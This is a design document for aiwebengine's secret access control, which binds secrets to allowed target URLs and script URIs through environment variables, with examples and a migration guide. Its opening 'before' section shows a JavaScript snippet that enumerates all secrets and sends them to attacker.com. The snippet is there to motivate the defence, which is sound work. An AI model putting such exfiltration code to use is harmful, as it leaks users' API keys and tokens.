# Secret Access Control

## Overview

Secrets in aiwebengine now support fine-grained access control by binding them to specific target URLs and script URIs. This prevents malicious scripts from exfiltrating secrets to unauthorized servers.

## Security Problem (Before)

Previously, secrets were global and could be used with any URL:

```javascript
// Malicious script could exfiltrate ALL secrets!
const secrets = secretStorage.list(); // ["anthropic_api_key", "github_token", ...]
secrets.forEach((secretId) => {
  fetch("https://attacker.com/steal", {
    headers: {
      "X-Secret": `{{secret:${secretId}}}`, // Rust injects actual value!
    },
  });
});
```

## Solution

Secrets are now tied to:

1. **Target URL patterns** - where the secret can be sent
2. **Script URI patterns** - which scripts can use the secret

## Environment Variable Format

### New Format (Constrained)

```bash
SECRET_<name>__ALLOW_<url_pattern>__SCRIPT_<script_pattern>=<value>
```

### Old Format (Unrestricted - Backward Compatible)

```bash
SECRET_<name>=<value>
```

## Pattern Matching

- **URL patterns**: Case-insensitive (normalized to lowercase for domain/scheme)
- **Script patterns**: Case-sensitive
- **Wildcards**: `*` matches any characters, `?` matches single character
- **No recursive wildcards**: `**` is not supported (start simple)

## Examples

### Anthropic API Key

Only allow AI scripts to call Anthropic API:

```bash
export SECRET_ANTHROPIC_API_KEY__ALLOW_https://api.anthropic.com/*__SCRIPT_/scripts/ai/*="sk-ant-api03-..."
```

- ✅ Allowed: `/scripts/ai/chat.js` → `https://api.anthropic.com/v1/messages`
- ❌ Blocked: `/scripts/ai/chat.js` → `https://attacker.com/steal`
- ❌ Blocked: `/scripts/malicious.js` → `https://api.anthropic.com/v1/messages`

### GitHub Token

Only allow integration scripts to access GitHub API:

```bash
export SECRET_GITHUB_TOKEN__ALLOW_https://api.github.com/*__SCRIPT_/scripts/integrations/github*="ghp_..."
```

- ✅ Allowed: `/scripts/integrations/github.js` → `https://api.github.com/repos`
- ✅ Allowed: `/scripts/integrations/github_issues.js` → `https://api.github.com/issues`
- ❌ Blocked: `/scripts/other.js` → `https://api.github.com/repos`

### Wildcard Subdomain

Allow any Anthropic subdomain:

```bash
export SECRET_CLAUDE_KEY__ALLOW_https://*.anthropic.com/*__SCRIPT_/scripts/ai/*="sk-ant-..."
```

- ✅ Matches: `https://api.anthropic.com/v1/messages`
- ✅ Matches: `https://console.anthropic.com/api`
- ❌ Blocked: `https://anthropic.com` (no subdomain)

### Multiple Wildcards

```bash
export SECRET_API_KEY__ALLOW_https://*.example.com/v*/api__SCRIPT_/scripts/*/integrations.js="key123"
```

- ✅ Matches: `https://api.example.com/v1/api` + `/scripts/github/integrations.js`
- ✅ Matches: `https://beta.example.com/v2/api` + `/scripts/slack/integrations.js`

### Unrestricted (Backward Compatible)

Old format still works without constraints:

```bash
export SECRET_INTERNAL_KEY="value123"
```

- ✅ Allowed: Any script → Any URL

## Configuration File Secrets

Secrets loaded from config files (TOML) are unrestricted:

```toml
[secrets]
internal_key = "value123"
```

For constrained secrets, use environment variables.

## Error Messages

### URL Constraint Violation

```
Secret 'anthropic_api_key' not allowed for URL: https://attacker.com/steal
```

### Script Constraint Violation

```
Secret 'github_token' not allowed for script: /scripts/malicious.js
```

### Secret Not Found

```
Secret 'nonexistent_key' not found
```

## Security Logging

All secret access attempts are logged with:

- Secret identifier (never the value)
- Target URL
- Script URI
- Success/failure

Constraint violations trigger warning logs for security monitoring:

```
WARN Secret access constraint violation:
  secret_id="anthropic_api_key"
  url="https://attacker.com/steal"
  script_uri="/scripts/ai/chat.js"
```

## Case Sensitivity

### URLs: Case-Insensitive

Domain and scheme are normalized to lowercase:

```bash
# Pattern: https://api.example.com/*
```

- ✅ Matches: `https://API.EXAMPLE.COM/path`
- ✅ Matches: `HTTPS://api.example.com/path`
- ✅ Matches: `https://api.EXAMPLE.com/path`

Path is preserved but pattern matching is case-insensitive.

### Script URIs: Case-Sensitive

Exact case match required:

```bash
# Pattern: /scripts/ai/*
```

- ✅ Matches: `/scripts/ai/chat.js`
- ❌ Fails: `/scripts/AI/chat.js`
- ❌ Fails: `/Scripts/ai/chat.js`

## Migration Guide

### Step 1: Identify Secrets in Use

```bash
# List all current secrets
grep "SECRET_" .env
```

### Step 2: Determine Required Constraints

For each secret, identify:

- Which external APIs it's used with (URL patterns)
- Which scripts need access (script patterns)

### Step 3: Update Environment Variables

Replace old format:

```bash
SECRET_ANTHROPIC_API_KEY="sk-ant-..."
```

With constrained format:

```bash
SECRET_ANTHROPIC_API_KEY__ALLOW_https://api.anthropic.com/*__SCRIPT_/scripts/ai/*="sk-ant-..."
```

### Step 4: Test

Run scripts and check logs for constraint violations:

```bash
grep "Secret access constraint violation" logs/app.log
```

### Step 5: Adjust Patterns

If legitimate requests are blocked, broaden patterns:

```bash
# Too restrictive
SECRET_KEY__ALLOW_https://api.exact.com/v1/endpoint__SCRIPT_/scripts/exact_script.js="..."

# Better
SECRET_KEY__ALLOW_https://api.exact.com/*__SCRIPT_/scripts/*="..."
```

## Best Practices

### 1. Start Restrictive

Begin with narrow patterns and broaden as needed:

```bash
# Start here
SECRET_KEY__ALLOW_https://api.example.com/v1/*__SCRIPT_/scripts/integration.js="..."

# Broaden if needed
SECRET_KEY__ALLOW_https://api.example.com/*__SCRIPT_/scripts/*="..."
```

### 2. Use Specific Patterns

Avoid overly broad wildcards:

```bash
# ❌ Too permissive
SECRET_KEY__ALLOW_*__SCRIPT_*="..."

# ✅ Better
SECRET_KEY__ALLOW_https://api.example.com/*__SCRIPT_/scripts/integrations/*="..."
```

### 3. Group Related Scripts

Organize scripts by function for easier pattern matching:

```
/scripts/
  ai/
    chat.js
    completion.js
  integrations/
    github.js
    slack.js
```

### 4. Monitor Logs

Regularly review security logs for:

- Unexpected constraint violations
- Patterns of suspicious activity
- Scripts attempting to use wrong secrets

### 5. Rotate Secrets

When rotating secrets, update both value and constraints:

```bash
# Old
SECRET_OLD_KEY__ALLOW_https://api.example.com/*__SCRIPT_/scripts/*="old_value"

# New (with tighter constraints)
SECRET_NEW_KEY__ALLOW_https://api.example.com/*__SCRIPT_/scripts/integrations/*="new_value"
```

## Implementation Details

### How It Works

1. JavaScript calls `fetch()` with template syntax in headers:

   ```javascript
   fetch("https://api.example.com/data", {
     headers: {
       Authorization: "Bearer {{secret:api_key}}",
     },
   });
   ```

2. Rust intercepts the request and:
   - Extracts secret identifier from template
   - Normalizes target URL (lowercase domain)
   - Gets current script URI from execution context
   - Validates URL matches secret's allowed URL pattern
   - Validates script URI matches secret's allowed script pattern
   - Injects secret value if constraints pass
   - Logs access (identifier only, never value)

3. If constraints fail:
   - Request is rejected with specific error
   - Violation is logged for security monitoring
   - JavaScript receives error message

### Architecture

- **secrets.rs**: Secret storage with `SecretEntry` struct containing value and glob matchers
- **http_client.rs**: Constraint validation during secret injection
- **secure_globals.rs**: Passes script URI to HTTP client
- **globset**: Glob pattern matching library for wildcards

## Troubleshooting

### Secret Not Working After Adding Constraints

**Problem**: Request fails after adding `__ALLOW_` and `__SCRIPT_`

**Check**:

1. Pattern syntax is correct (no typos)
2. URL includes scheme (`https://` not just `api.example.com`)
3. Script URI matches exactly (case-sensitive)
4. Wildcards are in the right place

**Debug**:

```javascript
// Add logging to see what's being requested
console.log("Fetching from:", url);
console.log("Script URI:", context.scriptUri);
```

### Pattern Not Matching

**Problem**: Pattern should match but doesn't

**Try**:

```bash
# Too specific
SECRET_KEY__ALLOW_https://api.example.com/v1/users__SCRIPT_/scripts/user_mgmt.js="..."

# Add wildcards
SECRET_KEY__ALLOW_https://api.example.com/v1/*__SCRIPT_/scripts/*.js="..."
```

### Case Sensitivity Issues

**Problem**: URL pattern not matching different case

**Remember**: URLs are case-insensitive (automatically normalized)

```bash
# This pattern
SECRET_KEY__ALLOW_https://api.example.com/*__SCRIPT_*="..."

# Matches all of these
# https://api.example.com/path
# https://API.EXAMPLE.COM/path
# HTTPS://api.example.com/path
```

**Problem**: Script pattern not matching

**Remember**: Script URIs are case-sensitive

```bash
# This pattern
SECRET_KEY__ALLOW_*__SCRIPT_/scripts/ai/*="..."

# ✅ Matches: /scripts/ai/chat.js
# ❌ Fails: /scripts/AI/chat.js
```

## FAQ

**Q: Can one secret have multiple URL/script patterns?**
A: Currently no. Start with one use case per secret. If you need multiple patterns, create separate secrets or use broader wildcards.

**Q: What happens to old `SECRET_NAME` format?**
A: It continues to work unchanged (unrestricted access). No breaking changes.

**Q: Can I use regex instead of glob patterns?**
A: No, only glob patterns (`*`, `?`) are supported. This keeps it simple and performant.

**Q: How do I allow a secret for multiple domains?**
A: Use wildcards or create separate secrets:

```bash
# Option 1: Wildcard
SECRET_KEY__ALLOW_https://*.example.com/*__SCRIPT_*="..."

# Option 2: Separate secrets
SECRET_KEY_API__ALLOW_https://api.example.com/*__SCRIPT_*="..."
SECRET_KEY_CONSOLE__ALLOW_https://console.example.com/*__SCRIPT_*="..."
```

**Q: Does this affect MCP client or other internal usage?**
A: No. Internal Rust code can use the deprecated `get()` method for backward compatibility. Constraints only apply to script-level `fetch()` calls.

**Q: Can scripts enumerate secrets with `secretStorage.list()`?**
A: Yes, but it's safe now because scripts can only _use_ secrets they're authorized for. Knowing an identifier doesn't help if constraints block access.
